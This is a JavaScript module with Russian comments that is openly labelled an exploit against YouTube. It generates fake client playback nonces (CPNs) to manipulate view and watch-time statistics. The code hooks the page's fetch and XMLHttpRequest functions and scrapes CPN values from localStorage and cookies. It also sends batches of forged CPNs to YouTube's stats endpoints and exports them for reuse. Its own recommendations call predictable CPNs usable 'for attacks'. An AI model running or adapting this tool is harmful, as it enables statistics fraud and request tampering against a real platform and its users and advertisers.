// CPN Generator Exploit - Генерация предсказуемых CPN для манипуляции статистикой
window.exploit_cpn_generator = {
  name: 'cpn_generator',
  description: 'Генератор CPN параметров для эксплуатации IDOR уязвимостей YouTube',
  version: '1.0',
  
  async execute(params) {
    console.log('🔑 Запуск CPN Generator с параметрами:', params);
    
    // Шаг 1: Анализ существующих CPN паттернов
    const existingPatterns = await this.analyzeExistingCPNs();
    
    // Шаг 2: Генерация новых CPN по разным алгоритмам
    const generatedCPNs = this.generateCPNs(params.quantity || 100);
    
    // Шаг 3: Валидация и тестирование CPN
    const validatedCPNs = await this.validateCPNs(generatedCPNs);
    
    // Шаг 4: Создание базы данных CPN
    const cpnDatabase = this.createCPNDatabase(validatedCPNs);
    
    // Шаг 5: Экспорт в различные форматы
    const exportData = this.exportCPNData(cpnDatabase);
    
    return {
      success: true,
      stats: {
        totalGenerated: generatedCPNs.length,
        validCPNs: validatedCPNs.length,
        uniquePatterns: cpnDatabase.patterns.length,
        predictabilityScore: this.calculatePredictabilityScore(cpnDatabase)
      },
      patterns: existingPatterns,
      cpnDatabase: cpnDatabase,
      exports: exportData,
      recommendations: this.getGenerationRecommendations(cpnDatabase),
      timestamp: new Date().toISOString()
    };
  },
  
  async analyzeExistingCPNs() {
    console.log('Анализ существующих CPN паттернов...');
    
    const patterns = {
      standard: [],
      timestampBased: [],
      incremental: [],
      encoded: [],
      custom: []
    };
    
    // Анализ из performance entries
    if (window.performance && window.performance.getEntriesByType) {
      const resources = window.performance.getEntriesByType('resource');
      resources.forEach(resource => {
        if (resource.name.includes('/api/stats/')) {
          try {
            const url = new URL(resource.name);
            const cpn = url.searchParams.get('cpn');
            if (cpn) {
              this.classifyCPN(cpn, patterns);
            }
          } catch(e) {}
        }
      });
    }
    
    // Анализ из текущих запросов
    this.interceptNetworkRequests(patterns);
    
    // Анализ из localStorage/cookies
    this.analyzeStoredCPNs(patterns);
    
    return patterns;
  },
  
  classifyCPN(cpn, patterns) {
    if (!cpn) return;
    
    // Стандартный паттерн: начинается с _, 11 символов
    if (cpn.startsWith('_') && cpn.length === 11) {
      patterns.standard.push(cpn);
      return;
    }
    
    // Timestamp based: содержит цифры и буквы в определенном соотношении
    if (/^[a-zA-Z0-9_]+$/.test(cpn)) {
      const charCount = cpn.length;
      const letterCount = (cpn.match(/[a-zA-Z]/g) || []).length;
      const digitCount = (cpn.match(/[0-9]/g) || []).length;
      
      if (digitCount > letterCount) {
        patterns.timestampBased.push(cpn);
      } else if (this.isIncremental(cpn)) {
        patterns.incremental.push(cpn);
      } else {
        patterns.custom.push(cpn);
      }
    }
  },
  
  isIncremental(cpn) {
    // Проверка на инкрементальные значения
    const chars = cpn.split('');
    let isSequential = true;
    
    for (let i = 1; i < chars.length; i++) {
      const prevCharCode = chars[i-1].charCodeAt(0);
      const currCharCode = chars[i].charCodeAt(0);
      
      if (currCharCode !== prevCharCode + 1) {
        isSequential = false;
        break;
      }
    }
    
    return isSequential;
  },
  
  interceptNetworkRequests(patterns) {
    // Перехват XMLHttpRequest
    const originalXHR = window.XMLHttpRequest;
    const self = this;
    
    window.XMLHttpRequest = function() {
      const xhr = new originalXHR();
      const originalOpen = xhr.open;
      
      xhr.open = function(method, url) {
        if (url && url.includes('youtube.com')) {
          try {
            const urlObj = new URL(url);
            const cpn = urlObj.searchParams.get('cpn');
            if (cpn) {
              self.classifyCPN(cpn, patterns);
            }
          } catch(e) {}
        }
        return originalOpen.apply(this, arguments);
      };
      
      return xhr;
    };
    
    // Перехват Fetch API
    const originalFetch = window.fetch;
    window.fetch = function(...args) {
      const url = args[0];
      if (typeof url === 'string' && url.includes('youtube.com')) {
        try {
          const urlObj = new URL(url);
          const cpn = urlObj.searchParams.get('cpn');
          if (cpn) {
            self.classifyCPN(cpn, patterns);
          }
        } catch(e) {}
      }
      return originalFetch.apply(this, args);
    };
  },
  
  analyzeStoredCPNs(patterns) {
    // Анализ localStorage
    try {
      for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        
        if (key.includes('cpn') || key.includes('CPN')) {
          patterns.custom.push(`${key}: ${value}`);
        }
        
        // Поиск CPN в значениях
        if (value && value.includes('_') && value.length === 11) {
          const match = value.match(/_([A-Za-z0-9]{10})/);
          if (match) {
            patterns.standard.push(match[0]);
          }
        }
      }
    } catch(e) {}
    
    // Анализ cookies
    const cookies = document.cookie.split(';');
    cookies.forEach(cookie => {
      const [name, value] = cookie.trim().split('=');
      if (name.includes('cpn') || name.includes('CPN')) {
        patterns.custom.push(`${name}: ${value}`);
      }
    });
  },
  
  generateCPNs(quantity) {
    console.log(`Генерация ${quantity} CPN...`);
    
    const cpnList = [];
    const generationMethods = [
      'standard',
      'timestamp',
      'random',
      'encoded',
      'pattern_based'
    ];
    
    const itemsPerMethod = Math.ceil(quantity / generationMethods.length);
    
    // Метод 1: Стандартный YouTube CPN
    for (let i = 0; i < itemsPerMethod; i++) {
      cpnList.push({
        cpn: '_' + this.generateRandomString(10),
        method: 'standard',
        description: 'Стандартный 11-символьный CPN, начинается с _'
      });
    }
    
    // Метод 2: На основе timestamp
    for (let i = 0; i < itemsPerMethod; i++) {
      const timestamp = Date.now() + i;
      cpnList.push({
        cpn: this.encodeTimestamp(timestamp),
        method: 'timestamp',
        description: `CPN на основе timestamp: ${timestamp}`
      });
    }
    
    // Метод 3: Случайный
    for (let i = 0; i < itemsPerMethod; i++) {
      cpnList.push({
        cpn: this.generateRandomCPN(),
        method: 'random',
        description: 'Полностью случайный CPN'
      });
    }
    
    // Метод 4: Закодированные данные
    for (let i = 0; i < itemsPerMethod; i++) {
      const data = {
        t: Date.now(),
        r: Math.random(),
        i: i
      };
      cpnList.push({
        cpn: this.encodeData(data),
        method: 'encoded',
        description: `CPN с закодированными данными: ${JSON.stringify(data)}`
      });
    }
    
    // Метод 5: На основе паттернов
    for (let i = 0; i < itemsPerMethod; i++) {
      cpnList.push({
        cpn: this.generatePatternBasedCPN(i),
        method: 'pattern_based',
        description: `CPN на основе паттерна #${i}`
      });
    }
    
    return cpnList.slice(0, quantity);
  },
  
  generateRandomString(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  },
  
  encodeTimestamp(timestamp) {
    // Кодируем timestamp в base36 с префиксом
    const base36 = timestamp.toString(36);
    const prefix = 't' + Math.random().toString(36).substring(2, 3);
    return prefix + base36.substring(0, 10);
  },
  
  generateRandomCPN() {
    const methods = [
      () => '_' + this.generateRandomString(10),
      () => 'c' + Math.random().toString(36).substring(2, 12),
      () => 'v' + Date.now().toString(36) + Math.random().toString(36).substring(2, 5),
      () => {
        const parts = [
          Math.random().toString(36).substring(2, 4),
          Date.now().toString(36).substring(5, 9),
          Math.random().toString(36).substring(2, 4)
        ];
        return parts.join('_');
      }
    ];
    
    const method = methods[Math.floor(Math.random() * methods.length)];
    return method();
  },
  
  encodeData(data) {
    // Простое кодирование JSON в base64
    const jsonStr = JSON.stringify(data);
    const base64 = btoa(encodeURIComponent(jsonStr));
    // Берем первые 11 символов, заменяем невалидные
    return 'e' + base64.substring(0, 10).replace(/[^A-Za-z0-9]/g, 'x');
  },
  
  generatePatternBasedCPN(index) {
    const patterns = [
      // Паттерн 1: Чередование букв и цифр
      () => {
        let result = '';
        for (let j = 0; j < 11; j++) {
          if (j % 2 === 0) {
            result += String.fromCharCode(97 + (index + j) % 26); // буквы
          } else {
            result += (index + j) % 10; // цифры
          }
        }
        return result;
      },
      
      // Паттерн 2: На основе последовательности Фибоначчи
      () => {
        let fib = [1, 1];
        for (let j = 2; j < 11; j++) {
          fib[j] = fib[j-1] + fib[j-2];
        }
        return 'f' + fib.slice(0, 10).map(n => n % 36).map(n => n.toString(36)).join('');
      },
      
      // Паттерн 3: Хеш на основе индекса
      () => {
        let hash = 0;
        const str = index.toString();
        for (let j = 0; j < str.length; j++) {
          hash = ((hash << 5) - hash) + str.charCodeAt(j);
          hash |= 0;
        }
        return 'h' + Math.abs(hash).toString(36).substring(0, 10);
      }
    ];
    
    const patternIndex = index % patterns.length;
    return patterns[patternIndex]();
  },
  
  async validateCPNs(cpns) {
    console.log('Валидация сгенерированных CPN...');
    
    const validated = [];
    const batchSize = 5;
    
    for (let i = 0; i < cpns.length; i += batchSize) {
      const batch = cpns.slice(i, i + batchSize);
      
      await Promise.all(batch.map(async (cpnObj) => {
        try {
          const isValid = await this.testCPN(cpnObj.cpn);
          validated.push({
            ...cpnObj,
            valid: isValid,
            testedAt: new Date().toISOString()
          });
        } catch (error) {
          validated.push({
            ...cpnObj,
            valid: false,
            error: error.message,
            testedAt: new Date().toISOString()
          });
        }
      }));
      
      // Задержка между батчами
      await this.delay(100);
    }
    
    return validated;
  },
  
  async testCPN(cpn) {
    // Тестовый запрос с CPN
    const testUrl = `https://www.youtube.com/api/stats/test?cpn=${cpn}&t=${Date.now()}`;
    
    try {
      const response = await fetch(testUrl, {
        method: 'GET',
        mode: 'no-cors',
        credentials: 'omit'
      });
      
      // В режиме no-cors мы не можем прочитать ответ, но запрос отправлен
      return true;
    } catch (error) {
      // Проверяем другие endpoints
      return this.testAlternativeEndpoints(cpn);
    }
  },
  
  async testAlternativeEndpoints(cpn) {
    const endpoints = [
      `https://www.youtube.com/api/stats/watchtime?cpn=${cpn}`,
      `https://www.youtube.com/api/stats/playback?cpn=${cpn}`,
      `https://www.youtube.com/api/stats/qoe?cpn=${cpn}`
    ];
    
    for (const endpoint of endpoints) {
      try {
        await fetch(endpoint, {
          method: 'GET',
          mode: 'no-cors'
        });
        return true;
      } catch(e) {
        continue;
      }
    }
    
    return false;
  },
  
  createCPNDatabase(validatedCPNs) {
    console.log('Создание базы данных CPN...');
    
    const database = {
      metadata: {
        totalEntries: validatedCPNs.length,
        validEntries: validatedCPNs.filter(c => c.valid).length,
        generationDate: new Date().toISOString(),
        source: 'YouTube Ultimate Exploits v2.0'
      },
      patterns: [],
      byMethod: {},
      byValidity: {
        valid: [],
        invalid: []
      },
      statistics: {}
    };
    
    // Группировка по методу генерации
    validatedCPNs.forEach(cpn => {
      if (!database.byMethod[cpn.method]) {
        database.byMethod[cpn.method] = [];
      }
      database.byMethod[cpn.method].push(cpn);
      
      // Группировка по валидности
      if (cpn.valid) {
        database.byValidity.valid.push(cpn);
      } else {
        database.byValidity.invalid.push(cpn);
      }
      
      // Извлечение паттернов
      if (cpn.valid) {
        database.patterns.push({
          cpn: cpn.cpn,
          pattern: this.extractPattern(cpn.cpn),
          length: cpn.cpn.length,
          type: this.classifyCPNType(cpn.cpn)
        });
      }
    });
    
    // Статистика
    database.statistics = {
      averageLength: this.calculateAverageLength(validatedCPNs),
      validityRate: (database.byValidity.valid.length / validatedCPNs.length) * 100,
      methodDistribution: Object.keys(database.byMethod).reduce((acc, method) => {
        acc[method] = database.byMethod[method].length;
        return acc;
      }, {}),
      patternDiversity: new Set(database.patterns.map(p => p.pattern)).size
    };
    
    return database;
  },
  
  extractPattern(cpn) {
    // Преобразуем CPN в паттерн (заменяем буквы на A, цифры на 0, символы на _)
    return cpn.replace(/[A-Z]/g, 'A')
              .replace(/[a-z]/g, 'a')
              .replace(/[0-9]/g, '0')
              .replace(/[^A-Za-z0-9]/g, '_');
  },
  
  classifyCPNType(cpn) {
    if (cpn.startsWith('_')) return 'standard_youtube';
    if (cpn.startsWith('t')) return 'timestamp_based';
    if (cpn.startsWith('c')) return 'custom';
    if (cpn.startsWith('v')) return 'versioned';
    if (cpn.startsWith('e')) return 'encoded';
    if (cpn.startsWith('h')) return 'hashed';
    if (cpn.includes('_')) return 'multi_part';
    return 'unknown';
  },
  
  calculateAverageLength(cpns) {
    const totalLength = cpns.reduce((sum, cpn) => sum + cpn.cpn.length, 0);
    return totalLength / cpns.length;
  },
  
  calculatePredictabilityScore(database) {
    // Оценка предсказуемости CPN (0-100)
    const factors = {
      patternRepetition: this.calculatePatternRepetition(database.patterns),
      entropy: this.calculateEntropy(database),
      timestampCorrelation: this.checkTimestampCorrelation(database)
    };
    
    const score = (
      factors.patternRepetition * 0.4 +
      (100 - factors.entropy) * 0.4 +
      factors.timestampCorrelation * 0.2
    );
    
    return Math.min(100, Math.max(0, score));
  },
  
  calculatePatternRepetition(patterns) {
    const patternCounts = {};
    patterns.forEach(p => {
      patternCounts[p.pattern] = (patternCounts[p.pattern] || 0) + 1;
    });
    
    const maxCount = Math.max(...Object.values(patternCounts));
    const total = patterns.length;
    
    return (maxCount / total) * 100;
  },
  
  calculateEntropy(database) {
    // Простая оценка энтропии на основе разнообразия
    const uniquePatterns = new Set(database.patterns.map(p => p.pattern)).size;
    const totalPatterns = database.patterns.length;
    
    if (totalPatterns === 0) return 0;
    
    const diversityRatio = uniquePatterns / totalPatterns;
    return diversityRatio * 100;
  },
  
  checkTimestampCorrelation(database) {
    // Проверка корреляции с timestamp
    const timestampCpns = database.byMethod.timestamp || [];
    if (timestampCpns.length < 2) return 0;
    
    let correlationCount = 0;
    for (let i = 1; i < timestampCpns.length; i++) {
      const prev = timestampCpns[i-1];
      const curr = timestampCpns[i];
      
      if (prev.cpn && curr.cpn) {
        const prevTime = this.decodeTimestamp(prev.cpn);
        const currTime = this.decodeTimestamp(curr.cpn);
        
        if (prevTime && currTime && currTime > prevTime) {
          correlationCount++;
        }
      }
    }
    
    return (correlationCount / (timestampCpns.length - 1)) * 100;
  },
  
  decodeTimestamp(cpn) {
    try {
      if (cpn.startsWith('t')) {
        const base36 = cpn.substring(1);
        return parseInt(base36, 36);
      }
    } catch(e) {}
    return null;
  },
  
  exportCPNData(database) {
    const exports = {
      json: this.exportAsJSON(database),
      csv: this.exportAsCSV(database),
      sql: this.exportAsSQL(database),
      python: this.exportAsPython(database),
      javascript: this.exportAsJavaScript(database)
    };
    
    return exports;
  },
  
  exportAsJSON(database) {
    return JSON.stringify({
      metadata: database.metadata,
      cpns: database.byValidity.valid.map(c => c.cpn),
      statistics: database.statistics,
      generatedAt: new Date().toISOString()
    }, null, 2);
  },
  
  exportAsCSV(database) {
    let csv = 'CPN,Method,Valid,Pattern,Type\n';
    
    database.byValidity.valid.forEach(cpn => {
      const pattern = this.extractPattern(cpn.cpn);
      const type = this.classifyCPNType(cpn.cpn);
      csv += `"${cpn.cpn}","${cpn.method}","${cpn.valid}","${pattern}","${type}"\n`;
    });
    
    return csv;
  },
  
  exportAsSQL(database) {
    let sql = 'CREATE TABLE IF NOT EXISTS cpn_database (\n';
    sql += '  id INTEGER PRIMARY KEY AUTOINCREMENT,\n';
    sql += '  cpn TEXT NOT NULL,\n';
    sql += '  method TEXT,\n';
    sql += '  valid BOOLEAN,\n';
    sql += '  pattern TEXT,\n';
    sql += '  type TEXT,\n';
    sql += '  generated_at TIMESTAMP\n';
    sql += ');\n\n';
    
    sql += '-- Insert CPNs\n';
    database.byValidity.valid.forEach(cpn => {
      const pattern = this.extractPattern(cpn.cpn);
      const type = this.classifyCPNType(cpn.cpn);
      sql += `INSERT INTO cpn_database (cpn, method, valid, pattern, type, generated_at) VALUES ('${cpn.cpn}', '${cpn.method}', ${cpn.valid}, '${pattern}', '${type}', '${new Date().toISOString()}');\n`;
    });
    
    return sql;
  },
  
  exportAsPython(database) {
    let python = '# YouTube CPN Database - Python Export\n';
    python += 'import json\nimport datetime\n\n';
    python += 'cpn_database = {\n';
    python += '    "metadata": ' + JSON.stringify(database.metadata) + ',\n';
    python += '    "cpns": [\n';
    
    database.byValidity.valid.forEach((cpn, index) => {
      python += `        {"cpn": "${cpn.cpn}", "method": "${cpn.method}", "valid": ${cpn.valid}}`;
      if (index < database.byValidity.valid.length - 1) python += ',';
      python += '\n';
    });
    
    python += '    ]\n';
    python += '}\n\n';
    python += 'print(f"Total CPNs: {len(cpn_database[\'cpns\'])}")\n';
    python += 'print(f"Generation date: {cpn_database[\'metadata\'][\'generationDate\']}")\n';
    
    return python;
  },
  
  exportAsJavaScript(database) {
    let js = '// YouTube CPN Database - JavaScript Export\n';
    js += 'const cpnDatabase = {\n';
    js += '  metadata: ' + JSON.stringify(database.metadata) + ',\n';
    js += '  cpns: [\n';
    
    database.byValidity.valid.forEach((cpn, index) => {
      js += `    {cpn: "${cpn.cpn}", method: "${cpn.method}", valid: ${cpn.valid}}`;
      if (index < database.byValidity.valid.length - 1) js += ',';
      js += '\n';
    });
    
    js += '  ]\n';
    js += '};\n\n';
    js += '// Usage examples\n';
    js += 'function getRandomCPN() {\n';
    js += '  const validCpns = cpnDatabase.cpns.filter(c => c.valid);\n';
    js += '  return validCpns[Math.floor(Math.random() * validCpns.length)];\n';
    js += '}\n';
    
    return js;
  },
  
  getGenerationRecommendations(database) {
    const recommendations = [];
    
    if (database.statistics.validityRate < 50) {
      recommendations.push({
        priority: 'HIGH',
        action: 'Улучшить алгоритмы генерации',
        description: `Только ${database.statistics.validityRate.toFixed(1)}% CPN являются валидными`
      });
    }
    
    if (database.statistics.patternDiversity < 10) {
      recommendations.push({
        priority: 'MEDIUM',
        action: 'Увеличить разнообразие паттернов',
        description: `Обнаружено только ${database.statistics.patternDiversity} уникальных паттернов`
      });
    }
    
    const predictability = this.calculatePredictabilityScore(database);
    if (predictability > 70) {
      recommendations.push({
        priority: 'CRITICAL',
        action: 'Использовать высокопредсказуемые CPN',
        description: `Предсказуемость CPN: ${predictability.toFixed(1)}% - можно использовать для атак`
      });
    }
    
    // Рекомендации по методам генерации
    Object.entries(database.byMethod).forEach(([method, cpns]) => {
      const validCount = cpns.filter(c => c.valid).length;
      const validityRate = (validCount / cpns.length) * 100;
      
      if (validityRate > 80) {
        recommendations.push({
          priority: 'LOW',
          action: `Продолжить использование метода "${method}"`,
          description: `Валидность: ${validityRate.toFixed(1)}%`
        });
      }
    });
    
    return recommendations;
  },
  
  delay(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
};

console.log('✅ CPN Generator Exploit модуль загружен');